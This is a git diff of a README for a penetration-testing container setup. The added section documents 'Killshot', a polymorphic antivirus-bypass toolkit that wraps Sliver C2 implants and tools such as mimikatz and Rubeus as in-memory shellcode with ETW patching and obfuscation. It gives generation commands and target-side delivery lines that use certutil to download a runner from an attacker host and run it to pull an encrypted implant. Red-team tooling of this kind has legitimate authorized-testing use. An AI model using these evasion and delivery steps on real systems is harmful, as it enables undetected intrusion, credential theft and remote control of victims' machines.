@@ -51,9 +51,14 @@ Everything loads automatically via the zshrc that Exegol sources.
 
 ```
 p3ta_exegol/
+├── avbypass/
+│   ├── killshot.sh        # Main killshot CLI (bash)
+│   ├── gen_runner.py      # Polymorphic Go runner generator
+│   └── killshot.py        # Tool-specific shellcode generator
 ├── configs/
 │   ├── starship.toml      # Starship prompt config
 │   ├── zshrc              # Custom zsh config (auto-sourced by Exegol)
+│   ├── load_user_setup.sh # First-start setup (runs automatically)
 │   └── zellij/            # Zellij config with plugins
 ├── gpu/
 │   ├── install-gpu.sh     # Host-side: detect GPU, write config, patch startup
@@ -61,7 +66,6 @@ p3ta_exegol/
 ├── install.sh             # Full installer (run on host)
 ├── setup-dotfiles.sh      # Config sync only (run on host)
 ├── install-tools.sh       # CLI tool installer (run in container)
-├── load_user_setup.sh     # First-start setup (runs automatically)
 └── README.md
 ```
 
@@ -90,7 +94,51 @@ burppro    # Launch Burp Suite Pro
 
 ### Sliver C2
 Armory extensions auto-backup on shell exit to `setup/sliver/`.
-Restores automatically on new containers.
+Restores automatically on new containers. Sliver daemon auto-starts on container boot.
+
+### Killshot — Polymorphic AV Bypass Toolkit
+
+Converts tools and C2 implants to in-memory shellcode via Donut + a polymorphic Go loader. Each build randomizes variable names, obfuscates API strings, injects junk functions, patches ETW, and compiles through garble.
+
+Output goes to `/workspace/killshot` (exegol) or `~/killshot` (other).
+
+```bash
+# Generate Sliver beacon + runner
+killshot generate -l 10.10.14.5 --implant -p 443
+
+# Generate interactive session instead of beacon
+killshot generate -l 10.10.14.5 --implant -p 443 -t session
+
+# Just the runner (polymorphic loader)
+killshot generate --runner
+
+# Just the implant
+killshot generate -l 10.10.14.5 --implant
+
+# Generate everything (implant + runner + stager + tools)
+killshot generate -l 10.10.14.5 --all
+
+# Convert a specific tool to shellcode
+killshot tool SharpHound --params "-c All"
+killshot tool Rubeus --params "kerberoast"
+killshot tool mimikatz
+
+# List available tools
+killshot list
+
+# Serve payloads
+killshot serve
+```
+
+**Delivery on target:**
+```powershell
+certutil -urlcache -split -f http://LHOST:8000/runner.exe %TEMP%\r.exe
+%TEMP%\r.exe -remote http://LHOST:8000/implant.enc
+```
+
+**Beacon vs Session:**
+- `beacon` (default) — periodic check-in, stealthier, use `interactive` in sliver to upgrade
+- `session` — real-time interactive shell, noisier but supports `shell` command directly
 
 ### History Sharing
 ZSH history syncs across Zellij panes:
